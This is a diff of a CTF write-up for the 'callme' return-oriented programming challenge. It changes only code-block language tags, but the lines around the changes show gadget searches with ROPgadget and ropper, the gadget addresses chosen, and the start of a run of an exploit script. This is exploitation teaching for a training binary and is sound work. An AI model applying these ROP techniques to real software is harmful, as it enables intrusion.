@@ -47,7 +47,7 @@ We'll start by just looking for popping gadgets using the following:
 
 {% tabs %}
 {% tab title="ROPgadget" %}
-```bash
+```nasm
 $ ROPgadget --binary callme --only "pop|ret"
 Gadgets information
 ============================================================
@@ -71,7 +71,7 @@ Unique gadgets found: 14
 {% endtab %}
 
 {% tab title="ropper" %}
-```bash
+```nasm
 $ ropper -f callme --search "pop|ret"
 [INFO] Load gadgets for section: LOAD
 [LOAD] loading... 100%
@@ -102,7 +102,7 @@ $ ropper -f callme --search "pop|ret"
 
 We conveniently find the following gadget, which does everything we need:
 
-```as
+```nasm
 0x000000000040093c : pop rdi ; pop rsi ; pop rdx ; ret
 ```
 
@@ -113,7 +113,7 @@ This gadget works great! It loads all the values we could need into the register
 
 There is more than one way to do this problem. This happens to be the most efficient, but in the case that gadget wasn't there, there is this combination:
 
-```as
+```nasm
 0x00000000004009a3 : pop rdi ; ret
 0x000000000040093e : pop rdx ; ret
 0x00000000004009a1 : pop rsi ; pop r15 ; ret
@@ -124,7 +124,7 @@ In this case, we would need to load `r15` with a random value, but this would wo
 
 While we're at it, we will also grab a gadget to beat the `movaps` instruction. The longer the payload and the more jumps we make, the more often we need the gadget.
 
-```as
+```nasm
 0x00000000004006be : ret
 ```
 
@@ -204,7 +204,7 @@ p.interactive()
 
 Running this gives us the flag!
 
-```bash
+```nasm
 $ python3 exploit.py
 [*] '/home/joybuzzer/Documents/vunrotc/public/binex/05-rop/callme/src/callme'
     Arch:     amd64-64-little
